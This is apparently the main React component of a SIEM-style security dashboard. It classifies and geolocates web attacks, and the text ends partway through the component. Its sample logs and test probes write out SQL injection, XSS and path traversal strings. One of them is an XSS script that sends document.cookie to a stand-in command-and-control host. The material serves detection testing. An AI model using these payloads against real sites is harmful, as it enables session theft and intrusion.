import { ChangeEvent, DragEvent, useEffect, useMemo, useRef, useState } from "react";
import {
  Activity,
  AlertTriangle,
  Check,
  CheckCircle2,
  Clock,
  Copy,
  Download,
  FileText,
  Filter,
  Globe,
  MapPin,
  Inbox,
  Lock,
  LogOut,
  MousePointerClick,
  Pause,
  Play,
  RotateCcw,
  Search,
  SearchX,
  Server,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Terminal,
  Trash2,
  Upload,
  User,
  X,
  Zap,
} from "lucide-react";
import {
  Area,
  AreaChart,
  CartesianGrid,
  ResponsiveContainer,
  Tooltip,
  XAxis,
  YAxis,
} from "recharts";
import SafeLogViewer from "./components/SafeLogViewer";
import { LandingPage } from "./components/LandingPage";
import { LoginPage } from "./components/LoginPage";

type Severity = "CRITICAL" | "WARNING" | "NORMAL";

type LogEntry = {
  id: number;
  timestamp: string;
  source_ip: string;
  method: string;
  endpoint: string;
  status_code: number | string;
  severity: Severity;
  risk: "Critical" | "High" | "Medium" | "Low";
  message: string;
  location?: string | null;
  country?: string | null;
  city?: string | null;
  latitude?: number | null;
  longitude?: number | null;
  asn?: string | null;
  probability: number;
  attack_type?: string;
  features?: Record<string, unknown>;
  raw_line?: string;
  isNew?: boolean;
};

type GeoPin = {
  ip: string;
  country: string;
  city: string;
  latitude: number;
  longitude: number;
  attacks: number;
  risk: "Critical" | "High" | "Medium";
  asn: string;
  threat_level: string;
};

type AnalystNote = {
  id: string;
  eventId: number;
  author: string;
  text: string;
  timestamp: string;
};

// Initial fallback logs formatted in realistic enterprise syslog / weblog style
const defaultLogs: LogEntry[] = [
  {
    id: 101,
    timestamp: "2026-10-22 14:25:12",
    source_ip: "45.33.22.11",
    method: "POST",
    endpoint: "/api/login",
    status_code: 403,
    severity: "CRITICAL",
    risk: "Critical",
    message: "SQL Injection attempt detected on /api/login: ' OR 1=1 --",
    location: "Moscow, RU",
    country: "Russia",
    city: "Moscow",
    asn: "AS4134 Chinanet / DigitalOcean",
    probability: 98.4,
    attack_type: "SQL Injection",
    features: { url_length: 68, sql_keywords: 4, sql_comments: 2, url_entropy: 4.88, is_post: 1 },
    raw_line: `[CRITICAL] 2026-10-22 14:25:12 | 45.33.22.11 | SQL Injection attempt detected on /api/login | Status: 403 | Location: Moscow, RU`,
  },
  {
    id: 102,
    timestamp: "2026-10-22 14:24:48",
    source_ip: "185.74.22.91",
    method: "GET",
    endpoint: "/search?q=<script>alert(1)</script>",
    status_code: 400,
    severity: "CRITICAL",
    risk: "High",
    message: "Cross-site scripting (XSS) reflection payload inside query param 'q'",
    location: "Mumbai, IN",
    country: "India",
    city: "Mumbai",
    asn: "AS55836 Reliance Jio",
    probability: 94.2,
    attack_type: "Cross-Site Scripting",
    features: { url_length: 54, script_tags: 2, alert_tokens: 1, url_entropy: 4.12, is_post: 0 },
    raw_line: `[CRITICAL] 2026-10-22 14:24:48 | 185.74.22.91 | XSS vector payload in /search parameter | Status: 400 | Location: Mumbai, IN`,
  },
  {
    id: 103,
    timestamp: "2026-10-22 14:24:19",
    source_ip: "103.45.18.204",
    method: "GET",
    endpoint: "/static/../../etc/passwd",
    status_code: 404,
    severity: "WARNING",
    risk: "Medium",
    message: "Path traversal probe targeting restricted system file path",
    location: "Frankfurt, DE",
    country: "Germany",
    city: "Frankfurt",
    asn: "AS24940 Hetzner Online GmbH",
    probability: 76.5,
    attack_type: "Path Traversal",
    features: { url_length: 38, path_traversal_count: 2, sensitive_files: 1, url_entropy: 3.42, is_post: 0 },
    raw_line: `[WARNING] 2026-10-22 14:24:19 | 103.45.18.204 | Directory traversal pattern in /static | Status: 404 | Location: Frankfurt, DE`,
  },
  {
    id: 104,
    timestamp: "2026-10-22 14:23:45",
    source_ip: "192.168.1.45",
    method: "POST",
    endpoint: "/auth/session",
    status_code: 200,
    severity: "NORMAL",
    risk: "Low",
    message: "User 'admin' login successful | Session verified",
    location: "Internal LAN",
    country: "United States",
    city: "Dallas",
    asn: "AS7018 AT&T Services",
    probability: 4.1,
    attack_type: "Normal Traffic",
    features: { url_length: 13, sql_keywords: 0, url_entropy: 2.11, is_post: 1 },
    raw_line: `[INFO] 2026-10-22 14:23:45 | 192.168.1.45 | User 'admin' login successful | Status: 200`,
  },
  {
    id: 105,
    timestamp: "2026-10-22 14:23:01",
    source_ip: "91.208.72.16",
    method: "GET",
    endpoint: "/api/v1/products?limit=20&page=1",
    status_code: 200,
    severity: "NORMAL",
    risk: "Low",
    message: "Standard catalog product retrieval request",
    location: "London, UK",
    country: "United Kingdom",
    city: "London",
    asn: "AS13037 Zen Internet",
    probability: 2.8,
    attack_type: "Normal Traffic",
    features: { url_length: 33, sql_keywords: 0, url_entropy: 2.45, is_post: 0 },
    raw_line: `[INFO] 2026-10-22 14:23:01 | 91.208.72.16 | Standard GET /api/v1/products | Status: 200 | Location: London, UK`,
  },
  {
    id: 106,
    timestamp: "2026-10-22 14:22:30",
    source_ip: "142.250.190.46",
    method: "GET",
    endpoint: "/healthz",
    status_code: 200,
    severity: "NORMAL",
    risk: "Low",
    message: "Kubernetes ingress health-probe ping",
    location: "Mountain View, US",
    country: "United States",
    city: "Mountain View",
    asn: "AS15169 Google LLC",
    probability: 1.2,
    attack_type: "Normal Traffic",
    features: { url_length: 8, sql_keywords: 0, url_entropy: 1.84, is_post: 0 },
    raw_line: `[INFO] 2026-10-22 14:22:30 | 142.250.190.46 | Ingress probe /healthz | Status: 200`,
  },
  {
    id: 107,
    timestamp: "2026-10-22 14:21:55",
    source_ip: "194.26.29.112",
    method: "POST",
    endpoint: "/admin/upload.php",
    status_code: 403,
    severity: "CRITICAL",
    risk: "Critical",
    message: "Arbitrary file upload exploit attempt (.php executable header)",
    location: "Amsterdam, NL",
    country: "Netherlands",
    city: "Amsterdam",
    asn: "AS49981 WorldStream B.V.",
    probability: 96.8,
    attack_type: "Malicious Upload",
    features: { url_length: 22, executable_extension: 1, is_post: 1, url_entropy: 3.94 },
    raw_line: `[CRITICAL] 2026-10-22 14:21:55 | 194.26.29.112 | Executable script upload to /admin/upload.php | Status: 403 | Location: Amsterdam, NL`,
  },
  {
    id: 108,
    timestamp: "2026-10-22 14:20:11",
    source_ip: "172.56.21.8",
    method: "GET",
    endpoint: "/assets/app.min.js",
    status_code: 304,
    severity: "NORMAL",
    risk: "Low",
    message: "Cached static asset retrieval",
    location: "null",
    country: "United States",
    city: "Seattle",
    asn: "AS21928 T-Mobile USA",
    probability: 1.9,
    attack_type: "Normal Traffic",
    features: { url_length: 18, url_entropy: 2.2 },
    raw_line: `[INFO] 2026-10-22 14:20:11 | 172.56.21.8 | Asset request /assets/app.min.js | Status: 304 | Location: null`,
  },
  {
    id: 109,
    timestamp: "2026-10-22 14:19:40",
    source_ip: "177.18.42.101",
    method: "POST",
    endpoint: "/api/v1/payment/checkout?bypass=true",
    status_code: 403,
    severity: "CRITICAL",
    risk: "Critical",
    message: "Parameter tampering exploit targeting payment authorization",
    location: "São Paulo, BR",
    country: "Brazil",
    city: "São Paulo",
    latitude: -23.5505,
    longitude: -46.6333,
    asn: "AS27699 Claro Brasil",
    probability: 95.7,
    attack_type: "Parameter Tampering",
    features: { url_length: 42, parameter_count: 1, is_post: 1, url_entropy: 3.8 },
    raw_line: `[CRITICAL] 2026-10-22 14:19:40 | 177.18.42.101 | Parameter tampering on /api/v1/payment | Status: 403 | Location: São Paulo, BR`,
  },
  {
    id: 110,
    timestamp: "2026-10-22 14:18:15",
    source_ip: "118.238.10.4",
    method: "GET",
    endpoint: "/wp-login.php?action=register&user=admin%27--",
    status_code: 400,
    severity: "CRITICAL",
    risk: "High",
    message: "Authentication bypass injection against WordPress administrative endpoint",
    location: "Tokyo, JP",
    country: "Japan",
    city: "Tokyo",
    latitude: 35.6762,
    longitude: 139.6503,
    asn: "AS2516 KDDI Corp",
    probability: 92.1,
    attack_type: "SQL Injection",
    features: { url_length: 49, sql_keywords: 1, sql_comments: 1, url_entropy: 4.1 },
    raw_line: `[CRITICAL] 2026-10-22 14:18:15 | 118.238.10.4 | Auth bypass attempt on /wp-login.php | Status: 400 | Location: Tokyo, JP`,
  },
  {
    id: 111,
    timestamp: "2026-10-22 14:17:02",
    source_ip: "139.130.4.5",
    method: "GET",
    endpoint: "/actuator/env",
    status_code: 403,
    severity: "WARNING",
    risk: "Medium",
    message: "Spring Boot actuator environment exposure reconnaissance probe",
    location: "Sydney, AU",
    country: "Australia",
    city: "Sydney",
    latitude: -33.8688,
    longitude: 151.2093,
    asn: "AS1221 Telstra Corp",
    probability: 79.4,
    attack_type: "Information Disclosure",
    features: { url_length: 13, sensitive_files: 1, is_post: 0, url_entropy: 2.8 },
    raw_line: `[WARNING] 2026-10-22 14:17:02 | 139.130.4.5 | Actuator probe on /actuator/env | Status: 403 | Location: Sydney, AU`,
  },
  {
    id: 112,
    timestamp: "2026-10-22 14:15:20",
    source_ip: "94.200.12.8",
    method: "POST",
    endpoint: "/xmlrpc.php",
    status_code: 403,
    severity: "CRITICAL",
    risk: "High",
    message: "XML-RPC brute-force amplification attack vector",
    location: "Dubai, AE",
    country: "United Arab Emirates",
    city: "Dubai",
    latitude: 25.2048,
    longitude: 55.2708,
    asn: "AS5384 Emirates Telecom",
    probability: 93.8,
    attack_type: "Brute-Force Amplification",
    features: { url_length: 11, is_post: 1, url_entropy: 2.9 },
    raw_line: `[CRITICAL] 2026-10-22 14:15:20 | 94.200.12.8 | XML-RPC brute force attack on /xmlrpc.php | Status: 403 | Location: Dubai, AE`,
  },
];

function mapBackendEvent(ev: any, fallbackId?: number): LogEntry {
  const isAttack = ev.prediction === "Attack";
  const severity: Severity = isAttack
    ? ev.risk === "Critical" || ev.risk === "High"
      ? "CRITICAL"
      : "WARNING"
    : "NORMAL";
  const ts = ev.timestamp
    ? ev.timestamp.includes("T")
      ? ev.timestamp.replace("T", " ").slice(0, 19)
      : ev.timestamp
    : new Date().toISOString().replace("T", " ").slice(0, 19);

  return {
    id: ev.id ?? fallbackId ?? Date.now(),
    timestamp: ts,
    source_ip: ev.source_ip || "Unknown",
    method: ev.method || "GET",
    endpoint: ev.endpoint || "/",
    status_code: ev.status_code || (isAttack ? (ev.risk === "Critical" ? 403 : 400) : 200),
    severity,
    risk: ev.risk || (isAttack ? "High" : "Low"),
    message: isAttack
      ? `${ev.attack_type || "Malicious request"} detected on ${ev.endpoint || "/"}`
      : `Clean ${ev.method || "GET"} request processed cleanly on ${ev.endpoint || "/"}`,
    location: ev.city && ev.country ? `${ev.city}, ${ev.country}` : (ev.country || "Unknown"),
    country: ev.country || "Unknown",
    city: ev.city || "Unknown",
    latitude: typeof ev.latitude === "number" ? ev.latitude : undefined,
    longitude: typeof ev.longitude === "number" ? ev.longitude : undefined,
    asn: ev.asn || (ev.source_ip?.startsWith("192.") || ev.source_ip?.startsWith("10.") ? "Internal RFC1918" : "AS15169 Transit"),
    probability: Math.round((ev.attack_probability ?? (isAttack ? 0.95 : 0.05)) * 1000) / 10,
    attack_type: ev.attack_type || (isAttack ? "Classified Threat" : "Normal Traffic"),
    features: ev.features || {},
    raw_line: `[${severity}] ${ts} | ${ev.source_ip || "Unknown"} | ${isAttack ? (ev.attack_type || "Malicious") : "Normal HTTP"} ${ev.endpoint || "/"} | Status: ${ev.status_code || (isAttack ? 403 : 200)} | Location: ${ev.city || "Unknown"}, ${ev.country || "Unknown"}`,
    isNew: isAttack,
  };
}

export default function App() {
  const [currentView, setCurrentView] = useState<"landing" | "login" | "console">("landing");
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(false);
  const [isAuthChecking, setIsAuthChecking] = useState<boolean>(true);
  const [isLoggingOut, setIsLoggingOut] = useState<boolean>(false);
  const [activeAnalyst, setActiveAnalyst] = useState<{ id: string; email?: string; name: string; role: string }>({
    id: "ALEX-TIER2",
    email: "analyst.alex@corp.internal",
    name: "Analyst Alex (Tier-2)",
    role: "ANALYST",
  });

  // Verify active session on initial page load
  useEffect(() => {
    fetch("http://127.0.0.1:8000/api/v1/auth/me", {
      credentials: "include",
    })
      .then((res) => res.json())
      .then((data) => {
        if (data.authenticated && data.user) {
          setIsAuthenticated(true);
          setActiveAnalyst({
            id: data.user.id || data.user.email,
            email: data.user.email,
            name: data.user.name || "SOC Analyst",
            role: data.user.role || "ANALYST",
          });
        }
      })
      .catch(() => {
        // Backend not ready or unauthenticated
      })
      .finally(() => {
        setTimeout(() => setIsAuthChecking(false), 350);
      });
  }, []);

  // Dynamic SEO title, meta title & meta description synchronizer across views
  useEffect(() => {
    let title = "DeepLog SIEM — Real-Time ML Cyber Threat Detection & Geolocation Platform";
    let description =
      "High-performance cybersecurity dashboard and SIEM platform ingesting system logs, classifying web attacks (SQLi, XSS, Path Traversal) via Random Forest ML, and geolocating threat actors in real time.";

    if (currentView === "landing") {
      title = "DeepLog SIEM — Real-Time ML Cyber Threat Detection & Geolocation Platform";
      description =
        "Zero-trust cybersecurity intelligence platform featuring real-time server log ingestion, 24-feature Random Forest ML web attack classification (SQLi, XSS, Path Traversal), and live global attacker geolocation.";
    } else if (currentView === "login") {
      title = "Analyst Authentication Portal — DeepLog SIEM";
      description =
        "Secure authentication portal for authorized SOC personnel. Protected by PBKDF2 HMAC-SHA256 password hashing, FIPS 140-2 TOTP MFA tokens, and sliding-window rate limiting defense.";
    } else if (currentView === "console") {
      title = "SOC Operations Console v2.4 — DeepLog SIEM";
      description =
        "Live security operations center workstation monitoring streaming ingress events, malicious payload triage, interactive risk probability distribution, and attacker geolocation mapping.";
    }

    document.title = title;

    // Update meta titles
    const metaTitle = document.querySelector('meta[name="title"]');
    if (metaTitle) metaTitle.setAttribute("content", title);
    const ogTitle = document.querySelector('meta[property="og:title"]');
    if (ogTitle) ogTitle.setAttribute("content", title);
    const twTitle = document.querySelector('meta[name="twitter:title"]');
    if (twTitle) twTitle.setAttribute("content", title);

    // Update meta descriptions
    const metaDesc = document.querySelector('meta[name="description"]');
    if (metaDesc) metaDesc.setAttribute("content", description);
    const ogDesc = document.querySelector('meta[property="og:description"]');
    if (ogDesc) ogDesc.setAttribute("content", description);
    const twDesc = document.querySelector('meta[name="twitter:description"]');
    if (twDesc) twDesc.setAttribute("content", description);
  }, [currentView]);

  // Real backend logout handler
  async function handleLogout() {
    setIsLoggingOut(true);
    try {
      await fetch("http://127.0.0.1:8000/api/v1/auth/logout", {
        method: "POST",
        credentials: "include",
      });
    } catch (e) {
      console.warn("Logout request failed:", e);
    }
    setTimeout(() => {
      setIsAuthenticated(false);
      setIsLoggingOut(false);
      setCurrentView("login");
    }, 600);
  }

  const [showDeleteAccountModal, setShowDeleteAccountModal] = useState(false);
  const [isDeletingAccount, setIsDeletingAccount] = useState(false);
  const [deleteAccountError, setDeleteAccountError] = useState("");
  const [deleteConfirmText, setDeleteConfirmText] = useState("");

  // Permanently delete analyst account handler
  async function handleDeleteAccount() {
    setIsDeletingAccount(true);
    setDeleteAccountError("");
    try {
      const res = await fetch("http://127.0.0.1:8000/api/v1/auth/account", {
        method: "DELETE",
        credentials: "include",
      });
      const data = await res.json();
      if (!res.ok) {
        throw new Error(data.detail || "Account deletion failed.");
      }
      setShowDeleteAccountModal(false);
      setIsAuthenticated(false);
      setActiveAnalyst({
        id: "GUEST",
        email: "demo.analyst@corp.internal",
        name: "Guest Analyst (Demo)",
        role: "VIEWER",
      });
      setCurrentView("login");
    } catch (err: any) {
      setDeleteAccountError(err.message || "Failed to delete analyst account.");
    } finally {
      setIsDeletingAccount(false);
    }
  }
  const [logs, setLogs] = useState<LogEntry[]>(defaultLogs);
  const [selectedLogId, setSelectedLogId] = useState<number>(101);
  const [searchQuery, setSearchQuery] = useState("");
  const [severityFilter, setSeverityFilter] = useState<"ALL" | Severity>("ALL");
  const [isStreaming, setIsStreaming] = useState(true);
  const [wsConnected, setWsConnected] = useState(false);
  const [probing, setProbing] = useState(false);
  const [probeNotice, setProbeNotice] = useState<string | null>(null);
  const [latencyMs, setLatencyMs] = useState(45);
  const [throughputEps, setThroughputEps] = useState(42.4);
  const [notes, setNotes] = useState<AnalystNote[]>([
    {
      id: "note-1",
      eventId: 101,
      author: "Analyst Alex (Tier-2)",
      text: "SQL injection payload targeting login auth handler. Source host IP flagged in abuse databases; recommended immediate IP quarantine.",
      timestamp: "14:26:05",
    },
  ]);
  const [currentNoteText, setCurrentNoteText] = useState("");
  const [showUploadModal, setShowUploadModal] = useState(false);
  const [uploading, setUploading] = useState(false);
  const [uploadError, setUploadError] = useState("");
  const [selectedGeoPin, setSelectedGeoPin] = useState<GeoPin | null>(null);
  const [copiedCurl, setCopiedCurl] = useState(false);
  const fileInputRef = useRef<HTMLInputElement | null>(null);
  const wsRef = useRef<WebSocket | null>(null);

  // Fetch backend historical events on mount
  useEffect(() => {
    fetch("http://127.0.0.1:8000/api/v1/events?limit=50")
      .then((res) => res.json())
      .then((data) => {
        if (data && Array.isArray(data.items) && data.items.length > 0) {
          const mapped: LogEntry[] = data.items.map((ev: any, index: number) =>
            mapBackendEvent(ev, 1000 + index)
          );
          setLogs(mapped);
          if (mapped[0]) setSelectedLogId(mapped[0].id);
        }
      })
      .catch(() => {
        // Backend offline or unreachable, default logs remain active
      });
  }, []);

  // Real WebSocket stream connected to DeepLog ML backend
  useEffect(() => {
    let socket: WebSocket | null = null;
    let reconnectTimer: ReturnType<typeof setTimeout> | null = null;
    let isUnmounted = false;

    function connect() {
      if (isUnmounted) return;
      try {
        const wsUrl = "ws://127.0.0.1:8000/api/v1/stream/ws";
        socket = new WebSocket(wsUrl);
        wsRef.current = socket;

        socket.onopen = () => {
          if (isUnmounted) return;
          setWsConnected(true);
        };

        socket.onmessage = (event) => {
          if (isUnmounted) return;
          try {
            const data = JSON.parse(event.data);
            if (data.type === "NEW_EVENT" && data.event) {
              const newEntry = mapBackendEvent(data.event);
              setLogs((prev) => [newEntry, ...prev.slice(0, 199)]);
              setLatencyMs((prev) =>
                Math.min(65, Math.max(18, Math.round(prev + (Math.random() * 4 - 2))))
              );
              setThroughputEps((prev) =>
                Math.round((prev + (Math.random() * 1.5 - 0.75)) * 10) / 10
              );
            }
          } catch (e) {
            console.error("Failed to parse websocket event:", e);
          }
        };

        socket.onclose = () => {
          if (isUnmounted) return;
          setWsConnected(false);
          reconnectTimer = setTimeout(connect, 3000);
        };

        socket.onerror = () => {
          socket?.close();
        };
      } catch (e) {
        setWsConnected(false);
        reconnectTimer = setTimeout(connect, 3000);
      }
    }

    connect();

    return () => {
      isUnmounted = true;
      if (reconnectTimer) clearTimeout(reconnectTimer);
      if (socket) socket.close();
    };
  }, []);

  // Toggle stream feed (pause/resume real background streamer)
  function toggleStream() {
    const nextState = !isStreaming;
    setIsStreaming(nextState);
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      wsRef.current.send(nextState ? "resume" : "pause");
    }
    fetch(`http://127.0.0.1:8000/api/v1/stream/${nextState ? "start" : "stop"}`, {
      method: "POST",
    }).catch(() => {});
  }

  // Inject real external HTTP request through ML pipeline on demand
  async function injectLiveProbe(type: "sqli" | "xss" | "normal") {
    setProbing(true);
    const attackIps = [
      "177.18.42.101",  // São Paulo
      "118.238.10.4",   // Tokyo
      "89.248.163.78",  // Bucharest
      "94.200.12.8",    // Dubai
      "188.40.82.11",   // Frankfurt
      "139.130.4.5",    // Sydney
      "165.21.42.1",    // Singapore
      "102.67.12.90",   // Lagos
      "52.204.18.91",   // Ashburn
    ];
    const pickedIp = attackIps[Math.floor(Math.random() * attackIps.length)];

    const probes = {
      sqli: {
        source_ip: pickedIp,
        method: "POST",
        url: "/api/v1/auth/login?user=admin' OR '1'='1' --",
        content_length: 64,
        user_agent: "sqlmap/1.7.2#dev",
      },
      xss: {
        source_ip: pickedIp,
        method: "GET",
        url: "/catalog/search?keyword=<script>fetch('http://c2.botnet.cc/?c='+document.cookie)</script>",
        content_length: 0,
        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
      },
      normal: {
        source_ip: pickedIp,
        method: "GET",
        url: "/api/v1/system/healthz",
        content_length: 0,
        user_agent: "Datadog-Agent/7.44.0",
      },
    };

    try {
      const res = await fetch("http://127.0.0.1:8000/api/v1/ingest/event", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(probes[type]),
      });
      const data = await res.json();
      setProbeNotice(
        `Live Ingested: ${data.prediction} (${data.risk || "Normal"} - ${Math.round(
          data.probability * 100
        )}%)`
      );
      setTimeout(() => setProbeNotice(null), 3500);
    } catch {
      setProbeNotice("Ingestion probe failed");
      setTimeout(() => setProbeNotice(null), 3000);
    } finally {
      setProbing(false);
    }
  }

  // Selected Log
  const selectedLog = useMemo(() => {
    return logs.find((l) => l.id === selectedLogId) || logs[0];
  }, [logs, selectedLogId]);

  // Filtered Logs
  const filteredLogs = useMemo(() => {
    return logs.filter((log) => {
      const matchSeverity = severityFilter === "ALL" || log.severity === severityFilter;
      const matchQuery =
        !searchQuery.trim() ||
        log.source_ip.toLowerCase().includes(searchQuery.toLowerCase()) ||
        log.endpoint.toLowerCase().includes(searchQuery.toLowerCase()) ||
        log.message.toLowerCase().includes(searchQuery.toLowerCase()) ||
        (log.location && log.location.toLowerCase().includes(searchQuery.toLowerCase()));
      return matchSeverity && matchQuery;
    });
  }, [logs, severityFilter, searchQuery]);

  // Key Metrics
  const totalEvents = logs.length;
  const criticalThreats = logs.filter((l) => l.severity === "CRITICAL").length;
  const warnings = logs.filter((l) => l.severity === "WARNING").length;
  const normalCount = logs.filter((l) => l.severity === "NORMAL").length;

  // Time-Series Area Chart data (Normal vs. Malicious traffic over time)
  const timeSeriesData = useMemo(() => {
    const buckets = 8;
    const bucketSize = Math.max(1, Math.ceil(logs.length / buckets));
    const data = [];
    for (let i = 0; i < buckets; i++) {
      const slice = logs.slice(i * bucketSize, (i + 1) * bucketSize);
      if (slice.length === 0) break;
      const malicious = slice.filter((l) => l.severity === "CRITICAL" || l.severity === "WARNING").length;
      const normal = slice.filter((l) => l.severity === "NORMAL").length;
      const sample = slice[slice.length - 1] || slice[0];
      const timeStr = sample.timestamp ? sample.timestamp.slice(11, 16) : `14:0${i}`;
      data.push({
        time: timeStr,
        malicious,
        normal,
      });
    }
    return data.reverse();
  }, [logs]);

  // Geolocation Pins (Aggregated attacker IPs)
  const geoPins: GeoPin[] = useMemo(() => {
    const pinMap: Record<string, GeoPin> = {};
    const coords: Record<string, { lat: number; lng: number }> = {
      Russia: { lat: 55.7558, lng: 37.6173 },
      India: { lat: 19.076, lng: 72.8777 },
      Germany: { lat: 50.1109, lng: 8.6821 },
      Netherlands: { lat: 52.3676, lng: 4.9041 },
      "United States": { lat: 38.9072, lng: -77.0369 },
      Brazil: { lat: -23.5505, lng: -46.6333 },
      China: { lat: 31.2304, lng: 121.4737 },
      Japan: { lat: 35.6762, lng: 139.6503 },
      "United Kingdom": { lat: 51.5072, lng: -0.1276 },
      France: { lat: 48.8566, lng: 2.3522 },
      Canada: { lat: 43.6532, lng: -79.3832 },
      Australia: { lat: -33.8688, lng: 151.2093 },
      Singapore: { lat: 1.3521, lng: 103.8198 },
      "South Korea": { lat: 37.5665, lng: 126.9780 },
      Poland: { lat: 52.2297, lng: 21.0122 },
      Sweden: { lat: 59.3293, lng: 18.0686 },
      Switzerland: { lat: 47.3769, lng: 8.5417 },
      Romania: { lat: 44.4268, lng: 26.1025 },
      Ukraine: { lat: 50.4501, lng: 30.5234 },
      Argentina: { lat: -34.6037, lng: -58.3816 },
      Chile: { lat: -33.4489, lng: -70.6693 },
      Colombia: { lat: 4.7110, lng: -74.0721 },
      Mexico: { lat: 19.4326, lng: -99.1332 },
      "United Arab Emirates": { lat: 25.2048, lng: 55.2708 },
      Israel: { lat: 32.0853, lng: 34.7818 },
      "Saudi Arabia": { lat: 24.7136, lng: 46.6753 },
      "South Africa": { lat: -26.2041, lng: 28.0473 },
      Nigeria: { lat: 6.5244, lng: 3.3792 },
      Kenya: { lat: -1.2921, lng: 36.8219 },
      Egypt: { lat: 30.0444, lng: 31.2357 },
      "Hong Kong": { lat: 22.3193, lng: 114.1694 },
      Taiwan: { lat: 25.0330, lng: 121.5654 },
    };

    logs
      .filter((l) => l.severity === "CRITICAL" || l.severity === "WARNING")
      .forEach((l) => {
        const country = l.country || "Unknown Country";
        const city = l.city || "Unknown City";
        const key = `${country}-${city}`;
        const baseCoord = coords[country] || { lat: 35.0, lng: 15.0 };
        const lat = typeof l.latitude === "number" ? l.latitude : baseCoord.lat;
        const lng = typeof l.longitude === "number" ? l.longitude : baseCoord.lng;

        if (!pinMap[key]) {
          pinMap[key] = {
            ip: l.source_ip,
            country,
            city,
            latitude: lat,
            longitude: lng,
            attacks: 1,
            risk: l.risk === "Critical" ? "Critical" : "High",
            asn: l.asn || "AS15169 Transit Host",
            threat_level: l.probability > 90 ? "CRITICAL (High Confidence)" : "ELEVATED",
          };
        } else {
          pinMap[key].attacks += 1;
        }
      });

    return Object.values(pinMap);
  }, [logs]);

  // Attacker Rankings
  const topAttackers = useMemo(() => {
    const counts: Record<string, { country: string; city: string; attacks: number; risk: string }> = {};
    logs
      .filter((l) => l.severity === "CRITICAL" || l.severity === "WARNING")
      .forEach((l) => {
        const key = `${l.city || "Unknown"}, ${l.country || "Unknown"}`;
        if (!counts[key]) {
          counts[key] = { country: l.country || "Unknown", city: l.city || "Unknown", attacks: 1, risk: l.risk };
        } else {
          counts[key].attacks += 1;
        }
      });
    return Object.values(counts).sort((a, b) => b.attacks - a.attacks).slice(0, 6);
  }, [logs]);

  // Save Analyst Note
  function handleSaveNote() {
    if (!currentNoteText.trim() || !selectedLog) return;
    const newNote: AnalystNote = {
      id: `note-${Date.now()}`,
      eventId: selectedLog.id,
      author: `${activeAnalyst.name} (${activeAnalyst.role})`,
      text: currentNoteText.trim(),
      timestamp: new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" }),
    };
    setNotes([newNote, ...notes]);
    setCurrentNoteText("");
  }

  // Copy as cURL
  function copyCurl() {
    if (!selectedLog) return;
    const curl = `curl -X ${selectedLog.method} "http://target.corp${selectedLog.endpoint}" -H "X-Forwarded-For: ${selectedLog.source_ip}" -H "User-Agent: Mozilla/5.0 DeepLog-Replay"`;
    navigator.clipboard?.writeText(curl);
    setCopiedCurl(true);
    setTimeout(() => setCopiedCurl(false), 2000);
  }

  // Log Upload Handler
  async function handleFileUpload(file: File) {
    setUploading(true);
    setUploadError("");
    const formData = new FormData();
    formData.append("file", file);

    try {
      const res = await fetch("http://127.0.0.1:8000/api/v1/logs/upload", {
        method: "POST",
        body: formData,
      });
      const data = await res.json();
      if (!res.ok) {
        if (res.status === 429) {
          throw new Error(
            data.detail ||
              "Upload rate limit exceeded (HTTP 429): Maximum 10 file uploads per minute. Request throttled for server stability."
          );
        }
        throw new Error(data.detail || "Upload validation failed");
      }

      if (Array.isArray(data.events) && data.events.length > 0) {
        const uploadedLogs: LogEntry[] = data.events.map((ev: any, idx: number) => {
          const isAttack = ev.prediction === "Attack";
          const severity: Severity = isAttack
            ? (ev.risk === "Critical" || ev.risk === "High" ? "CRITICAL" : "WARNING")
            : "NORMAL";
          return {
            id: ev.id ?? 2000 + idx,
            timestamp: ev.timestamp ? ev.timestamp.replace("T", " ").slice(0, 19) : "2026-10-22 14:00:00",
            source_ip: ev.source_ip || "Unknown",
            method: ev.method || "GET",
            endpoint: ev.endpoint || "/",
            status_code: isAttack ? (ev.risk === "Critical" ? 403 : 400) : 200,
            severity,
            risk: ev.risk || (isAttack ? "High" : "Low"),
            message: isAttack
              ? `${ev.attack_type || "Suspicious attack vector"} detected on ${ev.endpoint || "/"}`
              : `Clean HTTP request on ${ev.endpoint || "/"}`,
            location: ev.city && ev.country ? `${ev.city}, ${ev.country}` : "Unknown",
            country: ev.country || "Unknown",
            city: ev.city || "Unknown",
            asn: "AS15169 External Ingestion",
            probability: Math.round((ev.attack_probability ?? (isAttack ? 0.95 : 0.05)) * 1000) / 10,
            attack_type: ev.attack_type || (isAttack ? "Classified Attack" : "Normal"),
            features: ev.features || {},
            raw_line: `[${severity}] ${ev.timestamp || "2026-10-22"} | ${ev.source_ip} | ${ev.endpoint} | Status: ${isAttack ? 403 : 200}`,
          };
        });
        setLogs(uploadedLogs);
        if (uploadedLogs[0]) setSelectedLogId(uploadedLogs[0].id);
        setShowUploadModal(false);
      }
    } catch (err: any) {
      setUploadError(err.message || "Failed to parse and classify log file.");
    } finally {
      setUploading(false);
    }
  }

  // Export Incident Report
  function downloadIncidentReport() {
    const report = [
      `========================================================================`,
      `DEEPLOG SIEM - SECURITY OPERATIONS CENTER INCIDENT REPORT`,
      `Timestamp: ${new Date().toISOString()}`,
      `Lead Analyst: Alex Rivera (Tier-2 SOC)`,
      `Total Processed Events: ${totalEvents}`,
      `Confirmed Malicious Attacks: ${criticalThreats}`,
      `Suspicious Anomalies: ${warnings}`,
      `Safe/Normal Volume: ${normalCount}`,
      `========================================================================\n`,
      `TRIAGED MALICIOUS EVENTS:\n`,
      ...logs
        .filter((l) => l.severity === "CRITICAL")
        .map(
          (l) =>
            `[${l.timestamp}] IP: ${l.source_ip} | Location: ${l.location} | Endpoint: ${l.endpoint} | Attack Type: ${l.attack_type} | Conf: ${l.probability}% | Status: ${l.status_code}`
        ),
      `\nANALYST INVESTIGATION NOTES:\n`,
      ...notes.map((n) => `[${n.timestamp}] (${n.author}) Event #${n.eventId}: ${n.text}`),
    ].join("\n");

    const blob = new Blob([report], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = `soc-incident-report-${Date.now()}.txt`;
    link.click();
    URL.revokeObjectURL(url);
  }

  // Preloader: Verifying cryptographic session on initial page load
  if (isAuthChecking) {
    return (
